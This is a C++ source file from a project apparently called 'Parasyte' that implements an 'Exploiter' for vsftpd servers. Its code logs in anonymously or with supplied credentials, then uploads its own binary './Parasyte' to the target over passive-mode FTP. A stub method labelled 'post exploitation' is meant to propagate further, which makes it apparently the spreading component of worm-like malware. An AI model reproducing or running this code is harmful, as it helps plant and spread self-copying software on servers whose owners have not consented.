/*
    Copyright (C) 2024 by alexbsec
    Permission is hereby granted, free of charge, to any person obtaining a copy of this
    software and associated documentation files (the "Software"), to deal in the Software
    without restriction, including without l> imitation the rights to use, copy, modify, merge,
    publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons
    to whom the Software is furnished to do so, subject to the following conditions:
    The above copyright notice and this permission notice shall be included in all copies or
    substantial portions of the Software.

    THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING
    BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
    IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER
    IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE
    OR OTHER DEALINGS IN THE SOFTWARE.
*/

// Include declarations

#include "ExploitBase.hpp"

#include <regex>
#include <string>

/* CODE START */

namespace parasyte {
namespace exploits {
  ExploitBase::ExploitBase(boost::asio::io_context& io_context, const ServerInfo& server_info, bool brute_force)
      : io_context_(io_context)
      , server_info_(server_info)
      , brute_force_(brute_force)
      , error_handler_(error_handler::ErrorHandler::error_type::ERROR) {
    if (server_info.server == "vsftpd") {
      if (brute_force) {
      } else {
        exploiter_ = std::make_unique<simple::ftp::Exploiter>(io_context, server_info.host, server_info.server, brute_force);
      }
    } else {
      exploiter_ = nullptr;
    }
  }

  simple::ftp::vsFTPStrategy::vsFTPStrategy(boost::asio::io_context& io_context, simple::ftp::vsFTPParams params)
      : io_context_(io_context)
      , host_(params.host)
      , username_(params.username)
      , password_(params.password)
      , socket_(io_context)
      , error_handler_(error_handler::ErrorHandler::error_type::ERROR) {
    try_anon_ = false;
    if (username_.empty() || username_ == "anonymous") try_anon_ = true;
  }

  simple::ftp::vsFTPStrategy::~vsFTPStrategy() {}

  void simple::ftp::vsFTPStrategy::Execute() {
    Connect();
    SendCommand("TYPE I\r\n");  // Set binary mode
    ReadResponse();
    SendFile("./Parasyte");
    ParsePASVResponse(response_);
  }

  void simple::ftp::vsFTPStrategy::SendFile(const std::string& filename) {
    SendCommand("PASV\r\n");  // Set passive mode
    ReadResponse();

    auto [passv_address, pasv_port] = ParsePASVResponse(response_);
    boost::asio::ip::tcp::endpoint data_endpoint(passv_address, pasv_port);
    boost::asio::ip::tcp::socket new_socket(io_context_);

    new_socket.connect(data_endpoint);
    std::ifstream file(filename, std::ios::binary);
    if (!file) {
      logger_.Log(parasyte::utils::logging::LogLevel::ERROR, "Failed to open file.");
      error_handler_.SetType(error_handler::ErrorHandler::error_type::ERROR);
      error_handler_.HandleError("Failed to open file.");
      return;
    }

    SendCommand("STOR " + filename + "\r\n");
    ReadResponse();

    boost::asio::streambuf file_buffer;
    while (file) {
      char data[1024];
      file.read(data, sizeof(data));
      std::size_t len = file.gcount();
      boost::asio::write(new_socket, boost::asio::buffer(data, len));
    }

    file.close();
    new_socket.close();
    logger_.Log(parasyte::utils::logging::LogLevel::INFO, "File sent successfully.");
  }

  void simple::ftp::vsFTPStrategy::Connect() {
    try {
      boost::asio::ip::tcp::resolver resolver(io_context_);
      boost::asio::ip::tcp::resolver::results_type endpoints = resolver.resolve(host_, "ftp");

      boost::asio::connect(socket_, endpoints);
      AttemptLogin();
    }
    catch (const std::exception& e) {
      error_handler_.HandleError(e.what());
    }
  }

  void simple::ftp::vsFTPStrategy::SendCommand(const std::string& command) {
    try {
      socket_.write_some(boost::asio::buffer(command));
    }
    catch (const std::exception& e) {
      error_handler_.HandleError(e.what());
    }
  }

  std::string simple::ftp::vsFTPStrategy::ReadResponse() {
    try {
      boost::asio::streambuf response;
      boost::asio::read_until(socket_, response, "\r\n");

      std::istream response_stream(&response);
      std::string response_line;
      std::getline(response_stream, response_line);
      response_ = response_line;
      return response_line;
    }
    catch (const std::exception& e) {
      error_handler_.SetType(error_handler::ErrorHandler::error_type::ERROR);
      logger_.Log(parasyte::utils::logging::LogLevel::ERROR, e.what());
      error_handler_.HandleError(e.what());
    }

    return "";
  }

  void simple::ftp::vsFTPStrategy::AttemptLogin() {
    if (try_anon_) {
      AttemptAnonLogin();
    } else {
      AttemptUserLogin();
    }
  }

  void simple::ftp::vsFTPStrategy::AttemptAnonLogin() {
    try {
      socket_.write_some(boost::asio::buffer("USER anonymous\r\n"));
      socket_.write_some(boost::asio::buffer("PASS guest@\r\n"));

      boost::asio::streambuf response;
      boost::asio::read_until(socket_, response, "\r\n");

      std::istream response_stream(&response);
      std::getline(response_stream, response_);
      if (response_.find("230") != std::string::npos) {
        is_logged_in_ = true;
        logger_.Log(parasyte::utils::logging::LogLevel::INFO, "Successfully logged in anonymously.");
      } else {
        error_handler_.SetType(error_handler::ErrorHandler::error_type::WARNING);
        std::ostringstream log;
        log << "Failed to login anonymously on " << host_ << ". Got response: " << response_;
        logger_.Log(parasyte::utils::logging::LogLevel::WARNING, log.str());
        error_handler_.HandleError("Failed to login anonymously.");
        is_logged_in_ = false;
      }
    }
    catch (const std::exception& e) {
      logger_.Log(parasyte::utils::logging::LogLevel::ERROR, e.what());
      is_logged_in_ = false;
      error_handler_.HandleError(e.what());
    }
  }

  void simple::ftp::vsFTPStrategy::AttemptUserLogin() {
    try {
      socket_.write_some(boost::asio::buffer("USER " + username_ + "\r\n"));
      socket_.write_some(boost::asio::buffer("PASS " + password_ + "\r\n"));

      boost::asio::streambuf response;
      boost::asio::read_until(socket_, response, "\r\n");

      std::istream response_stream(&response);
      std::getline(response_stream, response_);
      if (response_.find("230") != std::string::npos) {
        is_logged_in_ = true;
        logger_.Log(parasyte::utils::logging::LogLevel::INFO, "Successfully logged in.");
      } else {
        error_handler_.SetType(error_handler::ErrorHandler::error_type::WARNING);
        std::ostringstream log;
        log << "Failed to login on " << host_ << ". Got response: " << response_;
        logger_.Log(parasyte::utils::logging::LogLevel::WARNING, log.str());
        error_handler_.HandleError("Failed to login.");
        is_logged_in_ = false;
      }
    }
    catch (const std::exception& e) {
      logger_.Log(parasyte::utils::logging::LogLevel::ERROR, e.what());
      is_logged_in_ = false;
      error_handler_.HandleError(e.what());
    }
  }

  std::pair<boost::asio::ip::address, unsigned short> simple::ftp::vsFTPStrategy::ParsePASVResponse(const std::string& response
  ) {
    std::regex pasv_regex(R"(\((\d+),(\d+),(\d+),(\d+),(\d+),(\d+)\))");
    std::smatch matches;

    if (std::regex_search(response, matches, pasv_regex) && matches.size() == 7) {
      std::string ip = matches[1].str() + "." + matches[2].str() + "." + matches[3].str() + "." + matches[4].str();
      unsigned short port = std::stoi(matches[5]) * 256 + std::stoi(matches[6]);
      return {boost::asio::ip::make_address(ip), port};
    }

    error_handler_.SetType(error_handler::ErrorHandler::error_type::ERROR);
    error_handler_.HandleError("Failed to parse PASV response.");
    logger_.Log(parasyte::utils::logging::LogLevel::ERROR, "Failed to parse PASV response.");
    return {};
  }

  simple::ftp::Exploiter::Exploiter(
    boost::asio::io_context& io_context,
    const std::string& host,
    const std::string& server,
    bool brute_force
  )
      : io_context_(io_context)
      , socket_(io_context)
      , brute_force_(brute_force)
      , server_(server)
      , error_handler_(error_handler::ErrorHandler::error_type::ERROR) {
    if (server_ == "vsftpd") {
      if (brute_force_) {
        // Implement brute force strategy
      } else {
        vsFTPParams vsftpd_params = {host, "anonymous", "anonymous", server};
        strategy_ = std::make_unique<simple::ftp::vsFTPStrategy>(io_context_, vsftpd_params);
      }
    } else {
      strategy_ = nullptr;
    }
  }

  simple::ftp::Exploiter::~Exploiter() {}

  void simple::ftp::Exploiter::Exploit() {
    if (strategy_ == nullptr) {
      error_handler_.SetType(error_handler::ErrorHandler::error_type::WARNING);
      error_handler_.HandleError("No strategies available for this server.");
      return;
    }

    if (server_ == "vsftpd") {
      strategy_->Execute();
    }
  }

  void simple::ftp::Exploiter::Propagate() {
    if (strategy_ == nullptr) {
      error_handler_.SetType(error_handler::ErrorHandler::error_type::WARNING);
      error_handler_.HandleError("No strategies available for this server.");
      return;
    }

    // Propagate exploit (post exploitation)
  }
}
}